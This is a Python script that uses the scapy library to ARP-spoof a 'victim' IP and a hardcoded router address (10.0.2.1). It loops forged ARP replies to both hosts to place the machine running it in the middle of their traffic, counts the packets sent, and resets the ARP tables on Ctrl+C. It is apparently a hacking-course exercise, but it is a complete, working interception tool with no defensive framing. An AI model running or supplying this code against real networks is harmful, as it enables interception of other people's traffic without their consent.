import scapy.all as scapy
import time
import logging
import argparse

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


start=time.time()

def get_args():
    parser=argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target_ip",help="You need to put victim's IP adress here")
    options=parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip,source_ip):
    dest_mac=get_mac(dest_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False)

options=get_args()
target_ip=(options.target_ip)
router_ip="10.0.2.1"


sent_packets_count = 0
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: "+ str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print(f"\nYou pressed CTRL + C...Resetting ARP tables...please wait\n")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    end=time.time()
    vaqt=end-start
    print(f"[+] Total packets sent : { sent_packets_count}")
    print(f"The code has worked for {round(vaqt,2)} seconds")
